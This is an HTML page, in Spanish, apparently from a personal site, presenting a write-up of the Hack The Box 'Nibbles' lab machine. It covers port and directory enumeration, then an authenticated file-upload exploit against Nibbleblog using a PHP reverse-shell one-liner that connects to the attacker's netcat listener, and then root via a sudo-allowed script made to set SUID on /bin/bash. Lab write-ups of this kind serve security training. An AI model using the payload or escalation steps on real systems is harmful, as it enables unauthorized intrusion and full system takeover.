@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nibbles | HTB</title>
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1></h1>
+        <h1>Nibbles // Linux // Easy // HTB</h1>
+
+        
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/nibbles/nibbles_banner.png" alt="Nibbles - placeholder">
+        </div>
+        <br>
+
+        <article>
+
+          <!-- === PRIMERA SECCIÓN: Instalación y configuración de BSPWM === -->
+          <section id="Reconocimiento">
+            <h2>Fase de reconocimiento</h2>
+            <br>  
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+             <br>
+            <pre><code class="bash">nmap -sS -p- --open 10.129.21.219 -Pn -oN Ports</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sS:</strong> Especifico el uso de un escaneo SYN (half-open)</li>
+                <li><strong style="color: aquamarine;">-p-:</strong> Indico que quiero escanear todo el rango de puertos</li>
+                <li><strong style="color: aquamarine;">--open:</strong> Esto me filtra solo por los puertos abiertos</li>
+                <li><strong style="color: aquamarine;">-Pn:</strong> Esto hace que no haga ping por lo que acelera el escaneo</li>
+                <li><strong style="color: aquamarine;">-oN Ports:</strong> Guarda el resultado del escaneo en un archivo llamado Ports, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <br>
+           
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_nmap1.png" alt="Nibbles - Nmap puertos">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que solo el puerto 80 y el 22 están abiertos, por lo que procedo a hacer un escaneo más profundo en estos puertos:</p>
+            <br>
+            <pre><code class="bash">nmap -sCV -p 80,22 10.129.21.219 -oN Versions</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sCV:</strong> Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)</li>
+                <li><strong style="color: aquamarine;">-p 80,22:</strong> Indico que quiero escanear solo los puertos 80 y 22</li>
+                <li><strong style="color: aquamarine;">-oN Versions:</strong> Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_nmap2.png" alt="Nibbles - Nmap versiones">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que el puerto 80 tiene un servidor Apache 2.4.18 y el puerto 22 tiene un servicio SSH, por lo que procedo a revisar el puerto 80 para hacer un reconocimiento más detallado de la página web.</p>
+            <p>Dentro de la página web, no se ve nada más que un texto dde Hello world!</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_web.png" alt="Nibbles - Página web">
+            </div>
+            <br>
+            <p>Si revisamos el código fuente de la página web, encontramos un comentario que nos da una pista sobre la enumeración de directorios.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_web2.png" alt="Nibbles - Código fuente">
+            </div>
+            <br>
+            <h2>Enumeración de directorios</h2>
+            <p>Para la enumeración de directorios utilizo la herramienta gobuster con el siguiente comando:</p>
+            <br>
+            <pre><code class="bash">gobuster dir -u http://10.129.57.156 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">dir:</strong> Indica que se va a realizar una enumeración de directorios</li>
+                <li><strong style="color: aquamarine;">-u:</strong> Especifica la URL base</li>
+                <li><strong style="color: aquamarine;">-w:</strong> Especifica la ruta del archivo de wordlist que se va a usar</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_gobuster.png" alt="Nibbles - gobuster">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que hay varios directorios los cuales se pueden acceder y al acceder a ellos se puede ver una vulnerabilidad de directory listing.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_directory_listing.png" alt="Nibbles - directotry listing">
+            </div>
+            <br>
+            <p>Dentro de esos directorios se puede encontrar información interesante como la versión de Nibbleblog en el readme, credenciales en el archivo de configuración y enumeración de plugins</p>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_readme.png" alt="Nibbles - readme">
+            </div>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_config.png" alt="Nibbles - config">
+            </div>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_plugins.png" alt="Nibbles - plugins">
+            </div>
+            <br>
+            <h2>Análisis de los datos obtenidos</h2>
+            <p>Investigando primero sobre la versión que está siendo utilizada de Nibbleblog, me comenta que es vulnerable a Arbitrary File Upload por una extensión la cual ya confirmamos existe (My Image),
+             pero para explotar esta vulnerabilidad necesitamos tener acceso a la sección de administración, por lo que procedo a revisar el archivo de configuración para obtener las credenciales de acceso.</p>
+            </p>
+            <p>Una vez usamos las credenciales, podemos acceder al panel de administración y explotar la vulnerabilidad.</p>
+            <br>
+            <pre><code class="language-php">&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 4444 &gt;/tmp/f"); ?&gt;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_admin.png" alt="Nibbles - admin panel">
+            </div>
+            <br>
+            <p>Una vez subimos el exploit, debemos de establecer una escucha con nc y luego ir a buscar el archivo ejecutable para activarlo</p>
+            <br>
+            <pre><code class="bash">nc -lvnp 4444</code></pre>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_nc.png" alt="Nibbles - nc">
+            </div>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_shell.png" alt="Nibbles - shell">
+            </div>
+            <br>
+            <h2>Sanitización y enumeración interna</h2>
+            <p>Una vez obtengo una shell, procedo a iniciar el proceso de sanitización para poder operar de una manera más cómoda.</p>
+            <pre><code class="bash">script /dev/null -c bash
+stty raw -echo; fg
+reset</code></pre>
+            <br>
+            <p>Luego procedo a reparar las dimensiones de la terminal y exportar term para usar atajos de teclado.</p>
+            <pre><code class="bash">export TERM=xterm
+stty rows 51 columns 186</code></pre>
+            <p>Una vez ya todo está configurado, procedo a enumerar el sistema para buscar oportunidades de escalar privilegios.</p>
+            <p>Primero ejecuto el comando <code style="color:red;">id</code> para saber si pertenezco a algún grupo privilegiado.</p>
+            <p>Al no encontrar nada sospechoso, continúo con la enumeración. probando un <code style="color:red;">sudo -l</code> y ahi logro ver que puedo ejecutar un programa como usuario root.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_sudo.png" alt="Nibbles - sudo">
+            </div>
+            <br>
+            <p>Si listamos el home del usuario nibbler podemos ver que dicho archivo se encuentra dentro pero en formato .zip, por lo que debemos de extraerlo primero para poder acceder a él.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_zip.png" alt="Nibbles - zip">
+            </div>
+            <br>
+            <p>Una vez extraemos el archivo podemos modificar el contenido del mismo para alterar su comportamiento y obtener acceso como root.</p>
+            <p>En este caso yo he decidido modificar los permisos del binario /bin/bash para hacer que tenga permisos SUID y poder ejecutar comandos como root.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_suid.png" alt="Nibbles - suid">
+            </div>
+            <br>
+            <p>Una vez tenemos el archivo modificado, procedemos a ejecutarlo para hacer que se ejecute como root y luego comprobar los cambios.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/nibbles/nibbles_root.png" alt="Nibbles - root">
+            </div>
+            <br>
+            <p>Con esto, he completado el writeup de la máquina Nibbles de Hack The Box, demostrando cómo identificar y explotar la vulnerabilidad para obtener acceso no autorizado al sistema, y luego escalar privilegios aprovechando el comando sudo para ejecutar comandos como root.</p>
+            </section>
+         <footer class="post-footer">
+            <span class="post-date"><time datetime="2026-06-30">2026-06-30</time></span>
+            <div class="post-social">
+                <p>[ contact ]</p>
+                <a href="https://www.twitch.tv/kallrize" target="_blank">twitch</a>
+                <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank">Youtube</a>
+                <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank">linkedin</a>
+            </div>
+        </footer>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
